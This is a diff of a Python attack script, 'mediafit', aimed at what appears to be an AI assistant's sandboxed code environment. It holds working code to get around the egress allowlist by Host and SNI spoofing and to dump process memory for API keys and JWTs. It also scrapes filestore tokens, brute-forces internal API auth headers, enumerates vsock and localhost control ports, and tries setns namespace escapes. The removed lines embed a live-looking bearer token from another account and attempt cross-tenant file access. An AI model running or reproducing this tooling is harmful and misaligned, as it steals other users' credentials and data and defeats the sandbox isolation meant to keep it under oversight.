@@ -1,20 +1,13 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-"""mediafit v5.0.0 -- process_api control plane (vsock self-CID), egress bypass battery,
-/v1/internal + memory_stores, ingest.sock, setns."""
-import os, sys, json, re, time, ssl, base64, socket, struct, fcntl, ctypes
-import subprocess, traceback, urllib.request, urllib.error
+"""mediafit v5.1.0 -- egress over HTTP/1.1 (fix), localhost:2024 fingerprint,
+/proc/1 forensics (environ/mem/fd), vsock host 5005 enum, OTLP ingest, header brute."""
+import os, sys, json, re, time, ssl, base64, socket, struct, fcntl, subprocess, traceback
+import urllib.request, urllib.error
 
-VER="5.0.0"; API="https://api.anthropic.com"; FS=API+"/v1/filestore/fs/"
-OUTD="/mnt/user-data/outputs"; UP="/mnt/user-data/uploads"
-
-API_KEY = ""                      # <-- الصق sk-ant-... هنا إن وُجد
-# ================= PRE-FILLED (account 95fea912 / chat 013ZJmN6) =================
-PREV_FSID  = "claude_chat_013ZJmN641LGPJYjid1sLyHE"
-PREV_TOKEN = ("eyJhbGciOiJFUzI1NiIsImtpZCI6IktwbFRxWHVCODJRRzJ3ZHVxRnlHRXNnSDZuNDkzekVzZkg4cUhkWHFmaUEiLCJ0eXAiOiJKV1QifQ."
- "eyJhY2NvdW50X3V1aWQiOiI5NWZlYTkxMi1hYzMzLTQxYTctYTRjMC0xNWQ0YTJkZmQxNTIiLCJhbGxvd2VkX3Jvb3RzIjpbIi90b29sX3Jlc3VsdHMiXSwiZmlsZXN5c3RlbV9pZCI6ImNsYXVkZV9jaGF0XzAxM1pKbU42NDFMR1BKWWppZDFzTHlIRSIsIm9yZ191dWlkIjoiZjE0MDI0ZjUtYWQ1Ny00ZjQxLWFmYjctYjkzMjkwZmU0ZjEwIiwib3JnYW5pemF0aW9uX3V1aWQiOiJmMTQwMjRmNS1hZDU3LTRmNDEtYWZiNy1iOTMyOTBmZTRmMTAiLCJyZWFkb25seSI6dHJ1ZSwicmVzb2x2ZWRfd29ya3NwYWNlX3RhZ2dlZF9pZCI6Indya3NwY19PMSIsIndvcmtzcGFjZV90YWdnZWRfaWQiOiJkZWZhdWx0Iiwib3JnX3RhaW50cyI6W10sIndvcmtzcGFjZV91dWlkIjoiODIxOGU5NGItNzA1Ny00NjU1LWE0ODYtMDRmZDliOTg2MTVhIiwid29ya3NwYWNlX2NtZWtfZW5hYmxlZCI6ZmFsc2UsIndvcmtzcGFjZV9jbWVrX21vZGUiOiJub25lIiwiaWF0IjoxNzkyNTE3NzgzLCJleHAiOjE3OTI1MzkzODMsImlzcyI6ImZpbGVzdG9yZS1jbGllbnQiLCJhdWQiOlsiZmlsZXN0b3JlIl0sInN1YiI6Ijk1ZmVhOTEyLWFjMzMtNDFhNy1hNGMwLTE1ZDRhMmRmZDE1MiJ9."
- "hLQtOrnfhyguq8Y_5kKF8WFsZEdTjy8uZ11qSxXuz10zMJzmMegnlGCt1M_H-jy7HJ3v46AE2DCcNNoFZUdUEw")
-# =================================================================================
+VER="5.1.0"; API="https://api.anthropic.com"; FS=API+"/v1/filestore/fs/"
+OUTD="/mnt/user-data/outputs"
+API_KEY=""     # اختياري
 
 OUT,G=[],{}
 def w(s=""): print(s,flush=True); OUT.append(str(s))
@@ -22,7 +15,7 @@ def head(t): w("\n"+"="*70+"\n### "+t+"\n"+"="*70)
 P,F,U,I=[],[],[],[]
 def rec(k,m,ev=None):
     w("    "+{"P":"[PASS]","F":"[FAIL]","U":"[UNK]","I":"[INFO]"}[k]+" "+m)
-    if ev is not None: w("        "+str(ev)[:1300])
+    if ev is not None: w("        "+str(ev)[:1200])
     {"P":P,"F":F,"U":U,"I":I}[k].append(m)
 def sh(a,t=40):
     try:
@@ -30,55 +23,232 @@ def sh(a,t=40):
         return p.returncode,p.stdout.decode("utf-8","replace"),p.stderr.decode("utf-8","replace")
     except Exception as e: return -1,"","EXC:%s"%e
 def b64d(x): return base64.urlsafe_b64decode(x+"="*(-len(x)%4))
-def b64e(x):
-    if isinstance(x,(dict,list)): x=json.dumps(x,separators=(",",":"))
-    x=x if isinstance(x,bytes) else x.encode()
-    return base64.urlsafe_b64encode(x).rstrip(b"=").decode()
 def step(n,f):
     try: f()
     except Exception as e:
         w("    !! %s: %s"%(n,e)); w("    "+traceback.format_exc().strip().splitlines()[-1][:200])
 _CTX=ssl.create_default_context(); _CTX.check_hostname=False; _CTX.verify_mode=ssl.CERT_NONE
-def http(url,method="POST",token=None,body=None,t=12,hdrs=None,cap=300000):
-    h={"User-Agent":"mediafit/"+VER}
-    if token: h["Authorization"]="Bearer "+token
-    if body is not None and not isinstance(body,bytes): body=json.dumps(body).encode()
-    if body is not None and not (hdrs or {}).get("Content-Type"): h["Content-Type"]="application/json"
-    if hdrs: h.update(hdrs)
-    req=urllib.request.Request(url,method=method,headers=h,data=body)
-    try:
-        r=urllib.request.urlopen(req,timeout=t,context=_CTX); return r.status,r.read(cap)
-    except urllib.error.HTTPError as e:
-        try: return e.code,e.read()
-        except Exception: return e.code,b""
-    except Exception as e: return None,("ERR:%s"%e).encode()
-def api(m,p,tk=None,t=12):
-    s,b=http(FS+m,"POST",tk,p,t,{"Connect-Protocol-Version":"1"}); return s,b
-def raw(ip,port,req,timeout=6):
+
+# ---------- raw TCP helpers ----------
+def tcp(ip,port,req=b"",timeout=6,read=True):
     try:
         s=socket.create_connection((ip,port),timeout); s.settimeout(timeout)
-        s.sendall(req)
+        if req: s.sendall(req)
         d=b""
-        try: d=s.recv(3000)
-        except Exception: pass
+        if read:
+            try: d=s.recv(4000)
+            except Exception: pass
         s.close(); return d
     except Exception as e: return ("ERR:%s"%e).encode()
 
-# ------------------------------------------------------------------ 0
-def s_boot():
-    head("0. BOOT")
-    try: G["fsid"]=[m["filesystem_id"] for m in json.loads(open("/dev/shm/rclone-boot/config.json").read())["mounts"] if m.get("filesystem_id")][0]
-    except Exception as e: rec("U","config %s"%e)
+def h11(ip,port,host,path="/",method="GET",extra=b"",timeout=6):
+    req=(("%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: curl/8.5.0\r\n"
+          "Accept: */*\r\nConnection: close\r\n")%(method,path,host)).encode()+extra+b"\r\n"
+    return tcp(ip,port,req,timeout)
+
+def tls_sni(ip,port,sni,path="/",timeout=8):
+    try:
+        raw_s=socket.create_connection((ip,port),timeout)
+        ctx=ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT); ctx.check_hostname=False
+        ctx.verify_mode=ssl.CERT_NONE
+        s=ctx.wrap_socket(raw_s,server_hostname=sni)
+        s.sendall(("GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n"%(path,sni)).encode())
+        d=s.recv(3000); s.close(); return d
+    except Exception as e: return ("ERR:%s"%e).encode()
+
+def verdict(lbl,d):
+    d=d or b""
+    if d.startswith(b"ERR"): w("    %-52s -> %s"%(lbl,d[:80].decode("utf-8","replace"))); return None
+    line=d.split(b"\r\n")[0][:80].decode("utf-8","replace")
+    deny=b"x-deny-reason" in d or b" 403 " in d.split(b"\r\n")[0]
+    tag="   <== DENIED(403)" if deny else "   <== ALLOWED"
+    w("    %-52s -> %s%s"%(lbl,line,tag))
+    return (not deny)
+
+# ------------------------------------------------------------------ 1
+def s_egress():
+    head("1. EGRESS OVER HTTP/1.1  <== FIX + KEY TEST")
+    DENIED_IP="93.184.215.14"   # example.com
+    OTHER_IP="1.1.1.1"          # cloudflare
+    ALLOWED_IP="140.82.121.4"   # github.com
+    # baseline: denied host, denied Host -> must be 403
+    r=verdict("A baseline: Host=example.com @DENIED_IP:80", h11(DENIED_IP,80,"example.com"))
+    rec("P" if r is False else "U","baseline denied-host verdict=%s"%r)
+    # control: allowed host
+    verdict("B control: Host=github.com @ALLOWED_IP:80", h11(ALLOWED_IP,80,"github.com"))
+    # THE KEY TEST: allowed Host on a DENIED IP
+    r2=verdict("C SPOOF: Host=github.com @DENIED_IP:80", h11(DENIED_IP,80,"github.com"))
+    if r2: rec("P","*** EGRESS BYPASS: allowed Host accepted on DENIED IP -> arbitrary IP reachable ***")
+    verdict("D SPOOF: Host=github.com @1.1.1.1:80", h11(OTHER_IP,80,"github.com"))
+    verdict("E SPOOF: Host=pypi.org @1.1.1.1:80", h11(OTHER_IP,80,"pypi.org"))
+    # parser differentials, HTTP/1.1 now
+    for lbl,h in [("F NULLBYTE example.com\\x00.github.com","example.com\x00.github.com"),
+                  ("G NULLBYTE evil.com\\x00.github.com","evil.com\x00.github.com"),
+                  ("H TRAILDOT github.com.","github.com."),
+                  ("I UPPER GITHUB.COM","GITHUB.COM"),
+                  ("J AT github.com@example.com","github.com@example.com"),
+                  ("K COLON github.com:80","github.com:80"),
+                  ("L SPACE github.com (trailing space)","github.com ")]:
+        verdict(lbl+" @DENIED_IP", h11(DENIED_IP,80,h))
+    # absolute-form
+    verdict("M ABS http://github.com/ @DENIED_IP",
+            tcp(DENIED_IP,80,b"GET http://github.com/ HTTP/1.1\r\nHost: github.com\r\nConnection: close\r\n\r\n"))
+    verdict("N ABS http://example.com/ @DENIED_IP",
+            tcp(DENIED_IP,80,b"GET http://example.com/ HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n"))
+    # TLS SNI spoof on denied IP
+    d=tls_sni(DENIED_IP,443,"github.com")
+    w("    O TLS SNI=github.com @DENIED_IP:443 -> %r"%(d[:120]))
+    if d and not d.startswith(b"ERR") and b"HTTP/1" in d[:20]:
+        rec("P","*** TLS SNI SPOOF works: SNI=github.com on DENIED IP -> HTTPS reaches arbitrary IP ***")
+    d=tls_sni(DENIED_IP,443,"example.com")
+    w("    P TLS SNI=example.com @DENIED_IP:443 -> %r"%(d[:120]))
+    # port sweep on denied IP (HTTP/1.1)
+    for port in [80,443,8080,8443,3000,22,25]:
+        d=tcp(DENIED_IP,port,b"",4)
+        w("    port %-5d @DENIED_IP -> %s"%(port,"OPEN" if d and not d.startswith(b"ERR") else (d[:40].decode() if d else "closed")))
+
+# ------------------------------------------------------------------ 2
+def s_local():
+    head("2. localhost:2024 FINGERPRINT")
+    for req,lbl in [(b"GET / HTTP/1.0\r\n\r\n","GET / h1.0"),
+                    (b"GET /status HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n","GET /status h1.1"),
+                    (b"GET /v1/status HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n","GET /v1/status"),
+                    (b"POST /fs_sync HTTP/1.1\r\nHost: x\r\nContent-Length: 0\r\nConnection: close\r\n\r\n","POST /fs_sync"),
+                    (b"POST /container_name HTTP/1.1\r\nHost: x\r\nContent-Type: application/json\r\n"
+                     b"Content-Length: 19\r\nConnection: close\r\n\r\n{\"name\":\"mediafit\"}","POST /container_name"),
+                    (b"POST /mount_root HTTP/1.1\r\nHost: x\r\nContent-Type: application/json\r\n"
+                     b"Content-Length: 2\r\nConnection: close\r\n\r\n{}","POST /mount_root"),
+                    (b"GET / HTTP/1.1\r\nHost: x\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n"
+                     b"Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\n\r\n","WS upgrade")]:
+        d=tcp("127.0.0.1",2024,req,5)
+        w("    2024 %-20s -> %r"%(lbl,d[:220]))
+        if d and not d.startswith(b"ERR") and b"HTTP/" in d[:10]:
+            rec("P","localhost:2024 speaks HTTP (%s)"%lbl)
+    # scan nearby ports
+    for p in range(2020,2032):
+        d=tcp("127.0.0.1",p,b"",2)
+        if d is not None and not d.startswith(b"ERR"): w("    localhost:%d OPEN"%p)
+    for p in [2025,2026,9112,8000,8080,1024,5000,5001,5002,5005]:
+        d=tcp("127.0.0.1",p,b"GET / HTTP/1.0\r\n\r\n",2)
+        w("    localhost:%-5d -> %r"%(p,(d or b"")[:90]))
+
+# ------------------------------------------------------------------ 3
+def s_proc1():
+    head("3. /proc/1 FORENSICS  <== treasure")
+    for f in ["/proc/1/environ","/proc/1/maps","/proc/1/io","/proc/1/limits","/proc/1/stat"]:
+        try:
+            d=open(f,"rb").read()
+            w("    %-20s OK (%d bytes)"%(f,len(d)))
+            if f.endswith("environ"):
+                for kv in d.split(b"\x00"):
+                    if kv.strip(): w("        ENV %s"%kv.decode("utf-8","replace")[:150])
+        except Exception as e: w("    %-20s -> %s"%(f,str(e)[:80]))
+    # fd listing
+    try:
+        fds=sorted(os.listdir("/proc/1/fd"))
+        w("    /proc/1/fd (%d):"%len(fds))
+        for fd in fds[:40]:
+            try: w("        %s -> %s"%(fd,os.readlink("/proc/1/fd/"+fd)))
+            except Exception as e: w("        %s -> %s"%(fd,str(e)[:50]))
+        rec("P","/proc/1/fd readable")
+    except Exception as e: w("    /proc/1/fd -> %s"%str(e)[:80])
+    # mountinfo
+    try:
+        mi=open("/proc/1/mountinfo").read().splitlines()
+        w("    /proc/1/mountinfo (%d entries), selected:"%len(mi))
+        for l in mi:
+            if any(k in l for k in ("rclone","vsock","shm","sock","overlay","squash","ext4","dev/vd","host")):
+                w("        %s"%l[:190])
+    except Exception as e: w("    mountinfo -> %s"%e)
+    # mem dump + secret grep
+    try:
+        m=open("/proc/1/mem","rb",0)
+        got=0; pats=[rb"sk-ant-[A-Za-z0-9_\-]{20,}", rb"eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}"]
+        segs=open("/proc/1/maps").read().splitlines()
+        hits=set()
+        for l in segs[:400]:
+            try:
+                rng,perms=l.split()[0],l.split()[1]
+                if "r" not in perms: continue
+                a,b=[int(x,16) for x in rng.split("-")]
+                if not (0<b-a<=64*1024*1024): continue
+                m.seek(a); d=m.read(b-a); got+=len(d)
+                for p in pats:
+                    for mm in re.findall(p,d): hits.add(mm.decode()[:130])
+                if got>500*1024*1024: break
+            except Exception: continue
+        w("    /proc/1/mem read %d bytes, %d secrets"%(got,len(hits)))
+        for h in sorted(hits)[:25]: w("        SECRET %s"%h)
+        if hits: rec("P","/proc/1/mem dumped -> %d candidate secrets"%len(hits))
+    except Exception as e: w("    /proc/1/mem -> %s"%str(e)[:90])
+    # ns via ls
+    rc,o,_=sh(["sh","-c","ls -l /proc/1/ns/ 2>&1; echo ---; ls -l /proc/self/ns/ 2>&1"])
+    w("    ns compare:\n%s"%o.strip()[:600])
+
+# ------------------------------------------------------------------ 4
+def s_vsock():
+    head("4. vsock host 5002 / 5005 ENUMERATION")
+    if not hasattr(socket,"AF_VSOCK"): rec("U","no AF_VSOCK"); return
+    def vreq(port,req,timeout=6):
+        try:
+            s=socket.socket(socket.AF_VSOCK,socket.SOCK_STREAM); s.settimeout(timeout)
+            s.connect((2,port)); s.sendall(req)
+            d=b""
+            try: d=s.recv(2500)
+            except Exception: pass
+            s.close(); return d
+        except Exception as e: return ("ERR:%s"%e).encode()
+    for port in [5005,5002]:
+        for req,lbl in [(b"GET /v1/metrics HTTP/1.1\r\nHost: h\r\nConnection: close\r\n\r\n","GET /v1/metrics"),
+                        (b"GET /v1/logs HTTP/1.1\r\nHost: h\r\nConnection: close\r\n\r\n","GET /v1/logs"),
+                        (b"GET /v1/traces HTTP/1.1\r\nHost: h\r\nConnection: close\r\n\r\n","GET /v1/traces"),
+                        (b"GET /healthz HTTP/1.1\r\nHost: h\r\nConnection: close\r\n\r\n","GET /healthz"),
+                        (b"GET / HTTP/1.1\r\nHost: h\r\nConnection: close\r\n\r\n","GET /")]:
+            d=vreq(port,req)
+            w("    vsock 2:%d %-16s -> %r"%(port,lbl,d[:170]))
+            if d and b"200" in d[:16]: rec("P","vsock 2:%d %s -> 200"%(port,lbl))
+        # OTLP protobuf POST (empty message is valid)
+        d=vreq(port,b"POST /v1/metrics HTTP/1.1\r\nHost: h\r\nContent-Type: application/x-protobuf\r\n"
+                     b"Content-Length: 0\r\nConnection: close\r\n\r\n")
+        w("    vsock 2:%d POST /v1/metrics protobuf -> %r"%(port,d[:170]))
+        if d and b"200" in d[:16]: rec("P","vsock 2:%d OTLP metrics accepted"%port)
+
+# ------------------------------------------------------------------ 5
+def s_ingest():
+    head("5. ingest.sock OTLP POST")
+    p="/run/sandbox-telemetry/ingest.sock"
+    if not os.path.exists(p): rec("U","no ingest.sock"); return
+    def send(req):
+        try:
+            s=socket.socket(socket.AF_UNIX,socket.SOCK_STREAM); s.settimeout(5)
+            s.connect(p); s.sendall(req)
+            d=b""
+            try: d=s.recv(600)
+            except Exception: pass
+            s.close(); return d
+        except Exception as e: return ("ERR:%s"%e).encode()
+    for ct,lbl in [("application/x-protobuf","protobuf"),("application/json","json")]:
+        for path in ["/v1/metrics","/v1/logs","/v1/traces","/"]:
+            req=("POST %s HTTP/1.1\r\nHost: local\r\nContent-Type: %s\r\nContent-Length: 0\r\n"
+                 "Connection: close\r\n\r\n"%(path,ct)).encode()
+            d=send(req)
+            w("    ingest %-9s %-13s -> %r"%(lbl,path,d[:150]))
+            if d and b"200" in d[:16]: rec("P","ingest.sock accepts %s %s"%(lbl,path))
+
+# ------------------------------------------------------------------ 6
+def s_headers():
+    head("6. /v1/internal AUTH HEADER BRUTE (no API key)")
+    # recover a token
     JWT=re.compile(rb"eyJ[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}")
     TK=[]
-    for p in os.listdir("/proc"):
-        if not p.isdigit(): continue
+    for pid in os.listdir("/proc"):
+        if not pid.isdigit(): continue
         try:
-            if b"rclone" not in open("/proc/%s/cmdline"%p,"rb").read(): continue
-            maps=open("/proc/%s/maps"%p).read().splitlines(); mem=open("/proc/%s/mem"%p,"rb",0)
+            if b"rclone" not in open("/proc/%s/cmdline"%pid,"rb").read(): continue
+            maps=open("/proc/%s/maps"%pid).read().splitlines(); mem=open("/proc/%s/mem"%pid,"rb",0)
         except Exception: continue
-        for line in maps:
-            try: a,perms=line.split()[0],line.split()[1]
+        for l in maps:
+            try: a,perms=l.split()[0],l.split()[1]
             except Exception: continue
             if "r" not in perms: continue
             try: s0,e0=[int(x,16) for x in a.split("-")]
@@ -90,187 +260,35 @@ def s_boot():
                 t=m.decode()
                 if len(t.split(".")[2])!=86: t=".".join(t.split(".")[:2]+[t.split(".")[2][:86]])
                 if t not in TK: TK.append(t)
-    G["TK"]=TK
-    G["TOKEN"]=None; G["UPLOAD"]=None; G["CLAIMS"]={}
-    for t in TK:
-        try: pl=json.loads(b64d(t.split(".")[1]))
-        except Exception: continue
-        st,_=api("listDirectory",{"filesystem_id":pl.get("filesystem_id"),"path":"/outputs"},t)
-        if st==200:
-            G["CLAIMS"]=pl
-            if "/outputs" in (pl.get("allowed_roots") or []): G["TOKEN"]=t
-            if (pl.get("allowed_roots") or [])==["/uploads"]: G["UPLOAD"]=t
-    w("    fsid=%s acct=%s valid_tokens=%d"%(G.get("fsid"),G["CLAIMS"].get("account_uuid"),len(TK)))
-    rec("P" if G["TOKEN"] else "F","token=%s uploads=%s"%("yes" if G["TOKEN"] else "no","yes" if G["UPLOAD"] else "no"))
-
-# ------------------------------------------------------------------ 1
-def s_control_plane():
-    head("1. process_api CONTROL PLANE  <== P1")
-    # 1a localhost
-    for port in [2024,2025,9112]:
-        try:
-            s=socket.create_connection(("127.0.0.1",port),3); s.close()
-            rec("P","localhost:%d OPEN"%port)
-        except Exception as e:
-            w("    localhost:%d -> %s"%(port,str(e)[:70]))
-    # 1b HTTP control API on 2025
-    for path,method,body in [("/status","GET",None),("/container_name","POST",{"name":"mediafit"}),
-                             ("/fs_sync","POST",None),("/mount_root","POST",{}),
-                             ("/auth_public_key","POST",{}),("/shutdown","POST",None)]:
-        st,b=http("http://127.0.0.1:2025"+path,method,None,body,5)
-        w("    2025 %-18s %-4s -> %s %r"%(path,method,st,b[:200]))
-        if st and st!=404: rec("P","control endpoint alive: %s %s"%(method,path))
-    # 1c vsock self-CID -> process_api listener (bypasses --block-local-connections)
-    if hasattr(socket,"AF_VSOCK"):
-        cid=None
-        try:
-            f=os.open("/dev/vsock",os.O_RDONLY)
-            cid=struct.unpack("I",fcntl.ioctl(f,0x7b9,struct.pack("I",0)))[0]
-            os.close(f); w("    local vsock CID = %s"%cid)
-        except Exception as e: w("    CID ioctl: %s"%e)
-        targets=[("host",2),("self",cid)] if cid else [("host",2)]
-        for lbl,c in targets:
-            if c is None: continue
-            for port in [2024,2025,5001,5002,5005]:
-                try:
-                    s=socket.socket(socket.AF_VSOCK,socket.SOCK_STREAM); s.settimeout(3)
-                    s.connect((c,port))
-                    try:
-                        s.sendall(b"GET /status HTTP/1.0\r\nHost: x\r\n\r\n"); time.sleep(0.4)
-                        r=s.recv(500)
-                    except Exception: r=b""
-                    w("    vsock %s CID=%d port=%-5d CONNECTED -> %r"%(lbl,c,port,r[:200]))
-                    rec("P","vsock %s:%d reachable"%(lbl,port))
-                    s.close()
-                except Exception as e:
-                    w("    vsock %s:%d -> %s"%(lbl,port,str(e)[:60]))
-
-# ------------------------------------------------------------------ 2
-def s_egress():
-    head("2. EGRESS BYPASS BATTERY  <== P2")
-    ALLOWED_IP="140.82.121.4"     # github.com (allowlisted name)
-    DENIED_IP ="93.184.215.14"    # example.com (denied)
-    OTHER_IP  ="1.1.1.1"          # cloudflare (denied)
-    def show(lbl,d):
-        first=(d or b"").split(b"\r\n")[0][:70]
-        deny=b"x-deny-reason" in (d or b"")
-        w("    %-52s -> %s%s"%(lbl,first.decode("utf-8","replace"),
-                                "   <== DENIED" if deny else ("   <== ALLOWED" if d and not d.startswith(b"ERR") else "")))
-        return (not deny) and bool(d) and not d.startswith(b"ERR")
-    # 2a baseline
-    show("baseline Host=example.com @DENIED_IP:80",
-         raw(DENIED_IP,80,b"GET / HTTP/1.0\r\nHost: example.com\r\n\r\n"))
-    # 2b Host spoofing: allowed Host on a denied IP  (KEY TEST)
-    ok=show("SPOOF Host=github.com @DENIED_IP:80",
-            raw(DENIED_IP,80,b"GET / HTTP/1.0\r\nHost: github.com\r\n\r\n"))
-    if ok: rec("P","*** EGRESS: allowed-Host on denied-IP accepted (dial=%s) ***"%DENIED_IP)
-    show("SPOOF Host=github.com @1.1.1.1:80", raw(OTHER_IP,80,b"GET / HTTP/1.0\r\nHost: github.com\r\n\r\n"))
-    show("SPOOF Host=pypi.org @1.1.1.1:80", raw(OTHER_IP,80,b"GET / HTTP/1.0\r\nHost: pypi.org\r\n\r\n"))
-    # 2c parser differentials (Guan class)
-    show("NULLBYTE Host=example.com\\x00.github.com @DENIED_IP",
-         raw(DENIED_IP,80,b"GET / HTTP/1.0\r\nHost: example.com\x00.github.com\r\n\r\n"))
-    show("NULLBYTE Host=evil.com\\x00.github.com @DENIED_IP",
-         raw(DENIED_IP,80,b"GET / HTTP/1.0\r\nHost: evil.com\x00.github.com\r\n\r\n"))
-    show("TRAILDOT Host=github.com. @DENIED_IP", raw(DENIED_IP,80,b"GET / HTTP/1.0\r\nHost: github.com.\r\n\r\n"))
-    show("UPPER Host=GITHUB.COM @DENIED_IP", raw(DENIED_IP,80,b"GET / HTTP/1.0\r\nHost: GITHUB.COM\r\n\r\n"))
-    show("AT Host=github.com@example.com @DENIED_IP", raw(DENIED_IP,80,b"GET / HTTP/1.0\r\nHost: github.com@example.com\r\n\r\n"))
-    show("COLON Host=github.com:80 @DENIED_IP", raw(DENIED_IP,80,b"GET / HTTP/1.0\r\nHost: github.com:80\r\n\r\n"))
-    show("ABSOLUTE GET http://example.com/ @DENIED_IP", raw(DENIED_IP,80,b"GET http://example.com/ HTTP/1.0\r\n\r\n"))
-    show("ABSOLUTE GET http://github.com/ @DENIED_IP", raw(DENIED_IP,80,b"GET http://github.com/ HTTP/1.0\r\n\r\n"))
-    show("CONNECT example.com:443 @DENIED_IP", raw(DENIED_IP,80,b"CONNECT example.com:443 HTTP/1.0\r\n\r\n"))
-    # 2d port sweep on a denied host (does the proxy police all ports?)
-    for port in [22,25,53,80,443,3000,8000,8080,8443,9000]:
-        try:
-            s=socket.create_connection((DENIED_IP,port),4); s.close(); r="OPEN"
-        except Exception as e: r=str(e)[:40]
-        w("    port %-5d @DENIED_IP -> %s"%(port,r))
-
-# ------------------------------------------------------------------ 3
-def s_internal():
-    head("3. /v1/internal + memory_stores  (P3)")
-    tk=G.get("TOKEN")
-    AUTH=[]
-    if tk: AUTH+= [("bearer-fs",{"Authorization":"Bearer "+tk}),("x-api-key-fs",{"x-api-key":tk})]
-    if API_KEY: AUTH+= [("bearer-key",{"Authorization":"Bearer "+API_KEY}),
-                        ("x-api-key",{"x-api-key":API_KEY})]
-    if not AUTH: rec("U","no token"); return
-    urls=[("/v1/internal/anthropic.filestore.v1alpha.Filesystem/listDirectory",
-           {"filesystem_id":G.get("fsid"),"path":"/outputs"}),
-          ("/v1/internal/anthropic.memory.api.v1alpha.MemoryInternalService/ListMemories",{}),
-          ("/v1/memory_stores",{}),
-          ("/v1/memory_stores?beta=true",{})]
-    BETAS=[None,"managed-agents-2026-04-01","files-api-2025-04-14"]
-    for u,body in urls:
-        for an,ah in AUTH:
-            for beta in BETAS:
-                h=dict(ah); h["Connect-Protocol-Version"]="1"
-                h["anthropic-version"]="2023-06-01"
-                if beta: h["anthropic-beta"]=beta
-                st,b=http(API+u,"POST",None,body,8,h)
-                if st not in (404,None) and not (st==401 and b"Invalid bearer" in b and an.endswith("fs")):
-                    w("    %-62s %-11s beta=%-24s -> %s %s"%(u.split("/")[-1],an,str(beta),st,b[:150].decode("utf-8","replace")))
-                if st==200:
-                    rec("P","*** INTERNAL LIVE: %s auth=%s beta=%s ***"%(u,an,beta))
-                    # critical: cross-fs test through the internal route
-                    if "filesystem" in u.lower():
-                        for lbl,f in [("own",G.get("fsid")),("PREV",PREV_FSID)]:
-                            st2,_=http(API+u,"POST",None,{"filesystem_id":f,"path":"/outputs"},8,h)
-                            w("        cross-fs %-5s fsid=%s -> %s"%(lbl,f[-10:],st2))
-                            if st2==200 and lbl=="PREV": rec("P","*** CROSS-FS via /v1/internal ***")
-
-# ------------------------------------------------------------------ 4
-def s_ingest():
-    head("4. sandbox-telemetry ingest.sock")
-    p="/run/sandbox-telemetry/ingest.sock"
-    if not os.path.exists(p): rec("U","no ingest.sock"); return
-    for lbl,payload in [("empty",b""),("json",b'{"k":"v"}'),
-                        ("otlp-json",b'{"resourceMetrics":[]}'),
-                        ("http",b"POST /v1/metrics HTTP/1.0\r\n\r\n"),("nl",b"\n")]:
-        try:
-            s=socket.socket(socket.AF_UNIX,socket.SOCK_STREAM); s.settimeout(3)
-            s.connect(p); s.sendall(payload)
-            try: r=s.recv(500)
-            except Exception: r=b""
-            w("    ingest[%-9s] -> %r"%(lbl,r[:160])); s.close()
-            if r: rec("P","ingest.sock replies to %s"%lbl)
-        except Exception as e: w("    ingest[%s] -> %s"%(lbl,str(e)[:70]))
-
-# ------------------------------------------------------------------ 5
-def s_ns():
-    head("5. /proc/1 ns + caps")
-    for f in ["/proc/1/status","/proc/1/ns/net","/proc/1/root","/proc/1/cwd"]:
-        try:
-            if f.endswith("status"):
-                d=open(f).read()
-                w("    "+ " | ".join(l.strip() for l in d.splitlines()
-                    if l.startswith(("CapEff","CapPrm","NoNewPrivs","Seccomp","NSpid","Dumpable"))))
-            else:
-                w("    %-18s -> %s"%(f,os.readlink(f)))
-        except Exception as e: w("    %-18s -> %s"%(f,str(e)[:70]))
-    # setns attempt
-    libc=ctypes.CDLL("libc.so.6",use_errno=True)
-    CLONE_NEWNET=0x40000000
-    for ns in ["net","mnt","pid","user"]:
-        try:
-            fd=os.open("/proc/1/ns/"+ns,os.O_RDONLY)
-            r=libc.setns(fd,0)
-            w("    setns(%s) -> %s errno=%d"%(ns,r,ctypes.get_errno()))
-            os.close(fd)
-        except Exception as e: w("    setns(%s) -> %s"%(ns,str(e)[:70]))
-    rc,o,_=sh(["sh","-c","ls -la /sys/fs/cgroup | head -20; ls /sys/fs/cgroup/*process_api* 2>/dev/null | head"])
-    w("    cgroup: %s"%o.strip()[:400])
+    tk=TK[0] if TK else None
+    if not tk: rec("U","no token"); return
+    url=API+"/v1/internal/anthropic.filestore.v1alpha.Filesystem/listDirectory"
+    names=["x-api-key","api-key","x-anthropic-api-key","authorization","x-filestore-token",
+           "x-internal-token","x-session-token","x-auth-token","anthropic-api-key","x-claude-token",
+           "cookie","x-access-token","x-token"]
+    body=b'{"filesystem_id":"'+ (json.loads(b64d(tk.split(".")[1])).get("filesystem_id") or "").encode() +b'","path":"/outputs"}'
+    for n in names:
+        for val in [tk, "Bearer "+tk]:
+            try:
+                r=urllib.request.Request(url,method="POST",data=body,
+                    headers={n:val,"Content-Type":"application/json","anthropic-version":"2023-06-01"})
+                resp=urllib.request.urlopen(r,timeout=8,context=_CTX)
+                st,b=resp.status,resp.read()
+            except urllib.error.HTTPError as e: st,b=e.code,e.read()
+            except Exception as e: st,b=None,("ERR:%s"%e).encode()
+            if st not in (401,None):
+                w("    %-20s -> %s %s"%(n,st,b[:130].decode("utf-8","replace")))
+                rec("P","HEADER WORKS: %s"%n)
+            elif b and b"invalid x-api-key" not in b and b"Invalid bearer" not in b:
+                w("    %-20s -> %s %s"%(n,st,b[:130].decode("utf-8","replace")))
 
 def s_verdict():
     head("VERDICT")
     w("  PASS %d: %s"%(len(P),P)); w("  UNK %d: %s"%(len(U),U))
-    w("\n  ---- CARRY-OVER ----")
-    w("PREV_FSID  = %r"%(G.get("fsid") or ""))
-    w("PREV_TOKEN = %r"%(G.get("TOKEN") or ""))
-    w("ACCOUNT1_UUID = %r"%(G["CLAIMS"].get("account_uuid") or ""))
 
 def main():
-    for n,f in [("boot",s_boot),("cp",s_control_plane),("egress",s_egress),
-                ("internal",s_internal),("ingest",s_ingest),("ns",s_ns),("verdict",s_verdict)]:
+    for n,f in [("egress",s_egress),("local",s_local),("proc1",s_proc1),
